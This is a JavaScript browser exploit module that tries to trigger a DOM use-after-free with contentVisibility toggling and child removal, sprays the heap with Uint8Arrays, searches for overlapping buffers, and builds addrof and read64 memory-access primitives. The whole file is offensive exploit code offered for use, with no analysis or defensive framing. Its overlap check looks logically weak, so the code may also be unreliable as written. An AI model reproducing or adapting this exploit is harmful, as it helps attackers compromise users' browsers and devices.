import { Memory } from './module/mem.mjs';
import { debug_log } from './module/utils.mjs';
import { get_view_vector } from './module/memtools.mjs';
import { Int } from './module/int64.mjs';

let container = document.querySelector('.container');
let child = document.querySelector('.child');
let corrupted = null;

function sprayHeap() {
    let spray = [];
    for (let i = 0; i < 0x800; i++) {
        let a = new Uint8Array(0x1000);
        a.fill(0x41);
        spray.push(a);
    }
    return spray;
}

export function startExploit() {
    debug_log("Starting DOM-based UAF...");

    const observer = new MutationObserver(() => {
        debug_log("DOM mutation detected, triggering UAF...");
        triggerUAF();
    });
    observer.observe(container, { childList: true, subtree: true });

    triggerUAF();
}

function triggerUAF() {
    container.style.contentVisibility = "hidden";
    child.remove();

    setTimeout(() => {
        container.style.contentVisibility = "auto";
        let spray = sprayHeap();
        debug_log("UAF triggered, heap sprayed with Uint8Arrays");

        setTimeout(() => {
            tryPrimitives(spray);
        }, 100);
    }, 0);
}

function tryPrimitives(spray) {
    for (let arr of spray) {
        if (arr.length !== 0x1000) continue;

        try {
            let view = new Float64Array(arr.buffer);
            view[0] = 13.37;
            if (view[0] !== 13.37) {
                debug_log("Memory overlap succeeded!");
                corrupted = arr;
                initPrimitives(arr);
                break;
            }
        } catch (e) {}
    }

    if (!corrupted) {
        debug_log("No overlap detected.");
    }
}

function initPrimitives(arr) {
    debug_log("Initializing primitives using overlapped buffer...");
    let mem = new Memory(arr);
    let obj = {};
    let objAddr = mem.addrof(obj);
    debug_log("addrof({}) = 0x" + objAddr.toString(16));
    let check = mem.read64(objAddr);
    debug_log("read64(obj) = 0x" + check.toString(16));
}